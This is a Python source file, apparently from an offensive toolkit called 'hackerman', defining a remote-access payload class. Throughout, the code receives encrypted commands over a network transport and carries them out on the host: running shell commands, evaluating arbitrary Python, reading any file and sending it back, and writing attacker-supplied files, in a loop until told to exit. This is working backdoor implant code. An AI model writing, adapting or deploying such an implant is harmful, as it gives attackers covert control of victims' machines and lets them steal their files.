from hackerman import utils
import json

class BasePayload(object):
	def __init__(self, transport, crypto):
		self.conn = transport
		self.encrypt = crypto.encrypt
		self.decrypt = crypto.decrypt
		self.exit_trigger = False
	def do_cmd(self, cmd):
		res = cmd
		if cmd['type'] == 'sh':
			res['res'] = utils.b64e(utils.sh(cmd['cmd']))
			return res
		elif cmd['type'] == 'eval':
			try:
				r = eval(cmd['cmd'])
			except Exception as e:
				r = e
			res['res'] = r
			return res
		elif cmd['type'] == 'dl':
			try:
				fd = utils.b64e(open(cmd['fn'],'rb').read())
			except Exception as e:
				fd = utils.b64e(e.encode())
			res['res'] = fd
			return res
		elif cmd['type'] == 'ul':
			try:
				with open(cmd['fn'],'wb') as f:
					f.write(utils.b64d(cmd['fd']))
				r = True
			except Exception as e:
				r = e
			res['res'] = r
			return res
		elif cmd['type'] == 'exit':
			res['res'] = 'okay'
			self.exit_trigger = True
			return res
		else:
			res['res'] = "invalid type: "+cmd['type']
			return res
	def run(self):
		while True:
			try:
				dat = self.conn.recv()
				dec = self.decrypt(dat)

				cmd = json.loads(dec.decode())
				res = self.do_cmd(cmd)

				txt = json.dumps(res)
				enc = self.encrypt(txt.encode())

				self.conn.send(enc)

				if self.exit_trigger:
					break
			except Exception as e:
				print(e)